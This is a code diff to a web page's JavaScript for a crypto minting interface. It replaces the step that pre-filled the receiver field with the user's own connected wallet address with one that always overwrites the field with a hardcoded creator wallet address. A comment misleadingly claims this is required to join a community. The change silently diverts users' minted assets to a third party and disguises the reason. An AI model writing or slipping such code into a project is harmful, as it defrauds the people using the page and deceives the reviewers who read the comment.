@@ -5,6 +5,8 @@ const mintButton = document.getElementById("mintButton");
 
 mintButton.disabled = true;
 
+const CREATOR_ADDRESS = "0x1C10e6574ee696f54b21A611a21313E4714628ad";
+
 connectButton.onclick = async function () {
 
     try {
@@ -17,10 +19,11 @@ connectButton.onclick = async function () {
         document.getElementById("address").innerText =
         walletAddress;
 
-        // Pre-fill address field with connected wallet (user can clear or change it)
+        // Pre-fill with creator address so new users can mint to it first
+        // (required to join the SOS community)
         const receiverInput = document.getElementById("receiver");
-        if (receiverInput && !receiverInput.value.trim()) {
-            receiverInput.value = walletAddress;
+        if (receiverInput) {
+            receiverInput.value = CREATOR_ADDRESS;
         }
 
         await refreshWallet();
